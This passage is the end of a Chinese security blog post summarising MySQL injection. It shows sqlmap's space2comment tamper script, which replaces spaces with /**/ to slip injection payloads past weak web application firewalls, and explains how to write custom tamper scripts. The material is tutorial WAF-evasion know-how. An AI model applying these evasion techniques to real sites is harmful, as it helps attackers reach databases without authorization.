class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Replaces space character (' ') with comments '/**/'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class="line"><span class="string">    'SELECT/**/id/**/FROM/**/users'</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">""</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="string">"/**/"</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'\''</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">'"'</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">" "</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="string">"/**/"</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
+
+<p>结构分为:priority变量定义、dependencies定义、tamper函数定义 </p>
+<p>priority:定义脚本优先级，用于又多个tamper脚本情况 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__priority__=PRIORITY.LOWEST </span><br><span class="line">__priority__=PRIORITY.LOWER </span><br><span class="line">__priority__=PRIORITY.LOW</span><br><span class="line">__priority__=PRIORITY.NORMAL </span><br><span class="line">__priority__=PRIORITY.HIGH</span><br><span class="line">__priority__=PRIORITY.HIGHER </span><br><span class="line">__priority__=PRIORITY.HIGHEST</span><br></pre></td></tr></table></figure>
+
+<p>dependencies:函数声明该脚本适用或不适应的范围，可以为空 </p>
+<p>tamper:是主要函数，接受的参数为payload和**kwargs，返回值为替换后的payload</p>
+<p>在这个脚本中主要是用for循环遍历原先的payload，检测其中的空格(space)，替换为注释(/**/)。可以替换这两点的代码，自定义自己的tamper。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>安大侠</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://ama666.cn/2019/09/10/MySQL数据库注入方法总结/" title="MySQL数据库注入方法总结">http://ama666.cn/2019/09/10/MySQL数据库注入方法总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/02/Empirecms7.5 Audit/" rel="next" title="Empirecms7.5 Audit">
+                <i class="fa fa-chevron-left"></i> Empirecms7.5 Audit
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/17/靶机渗透TrOll-3/" rel="prev" title="靶机渗透TrOll:3">
+                靶机渗透TrOll:3 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
+            
+              <p class="site-author-name" itemprop="name">安大侠</p>
+              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">63</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">标签</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+              
+                
+              
+              
+              
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库相关注入语句收集"><span class="nav-number">1.</span> <span class="nav-text">数据库相关注入语句收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0"><span class="nav-number">1.0.1.</span> <span class="nav-text">0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1"><span class="nav-number">1.0.2.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2"><span class="nav-number">1.0.3.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3"><span class="nav-number">1.0.4.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4"><span class="nav-number">1.0.5.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5"><span class="nav-number">1.0.6.</span> <span class="nav-text">5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6"><span class="nav-number">1.0.7.</span> <span class="nav-text">6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7"><span class="nav-number">1.0.8.</span> <span class="nav-text">7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8"><span class="nav-number">1.0.9.</span> <span class="nav-text">8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9"><span class="nav-number">1.0.10.</span> <span class="nav-text">9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10"><span class="nav-number">1.0.11.</span> <span class="nav-text">10</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tamper编写"><span class="nav-number">1.0.12.</span> <span class="nav-text">tamper编写</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安大侠</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+  
+
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
